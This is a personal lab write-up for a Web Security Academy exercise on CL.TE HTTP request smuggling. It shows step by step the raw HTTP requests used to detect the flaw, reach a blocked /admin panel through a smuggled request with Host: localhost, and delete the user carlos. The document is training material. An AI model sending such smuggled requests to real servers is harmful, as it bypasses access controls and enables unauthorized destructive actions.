[Lab]()

[Explained](https://www.youtube.com/watch?v=L6GikFq4Xbc&list=PLGb2cDlBWRUX1_7RAIjRkZDYgAB3VbUSw&index=6&ab_channel=JarnoTimmermans)

> **LAB Notes:**
> - frontend doesn't support TE
> - /admin panel blocked by frontend
> - Solve the lab by smuggling a request to the backend server to admin panel to delete user carlos

# Detection

```
POST / HTTP/1.1
Host: 0a8b00bf03e39aab81956ba60061001c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X

```
> Timed-out (backend) -> CL.TE 

# Confirming 
#### Triggering a differential response:
```HTTP
POST / HTTP/1.1
Host: 0a8b00bf03e39aab81956ba60061001c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Transfer-Encoding: chunked

3
abc
0

GET /404 HTTP/1.1
foo: x
```
Got **200 OK** but the `GET /404` is cached in the backend so:
> Immediately send a normal request and got a **404 Not Found** confirming the vulnerability
![](../../../../Pasted%20image%2020250819172142.png)

# Crafting a Request 

First, I needed to find info in the admin panel and verify if I can access it:

```HTTP
POST / HTTP/1.1
Host: 0a8b00bf03e39aab81956ba60061001c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Transfer-Encoding: chunked

3
abc
0

GET /admin HTTP/1.1
foo: x
```

Sent this and immediately sent a normal request which is appended to the `GET /admin`:
![](../../../../Pasted%20image%2020250819173010.png)

With this restriction, I imagined I needed to use localhost as the **Host Header** value:
```HTTP
**POST / HTTP/1.1
Host: 0a8b00bf03e39aab81956ba60061001c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Transfer-Encoding: chunked

3
abc
0

GET /admin HTTP/1.1
Host: localhost
foo: x
```

Now, the normal request got a **400 Bad Request** : `"error":"Duplicate header names are not allowed"` referring to the Host Header since the normal request is looking like this:
![](../../../../Pasted%20image%2020250819174258.png)

## Fixing the Duplicate Header Error

#### Problem
Now, the tricky part is to get the normal request headers to not interfere with the smuggled request but, also making sure that it is correctly appended.
#### Solution
The simple way is to **make the backend interpret the normal request piece of the request as the request body**. 
For this to work, I needed to include the headers for Content-Type and Content-Length with the calculated appropriate (at least minimum) size so the request gets correctly appends and not ignored. 

#### Implement the solution and Get the Admin panel

```HTTP
POST / HTTP/1.1
Host: 0a8b00bf03e39aab81956ba60061001c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Transfer-Encoding: chunked

3
abc
0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

x=
```
> Minimum Size for the Content-Length is 3 (since body is 2 bytes `x=` +1 at least to append to the normal rquest)

Immediately sent the normal request and got the Admin Panel:
![](../../../../Pasted%20image%2020250819180724.png)
The deletion url endpoint for carlos:
`<a href="/admin/delete?username=carlos">`

# Executing the attack
First, sent the attack request:
```HTTP
POST / HTTP/1.1
Host: 0a8b00bf03e39aab81956ba60061001c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
Transfer-Encoding: chunked

3
abc
0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

x=
```
Immediately after, sent the normal request and got the successful deletion of carlos' account:
![](../../../../Pasted%20image%2020250819180413.png)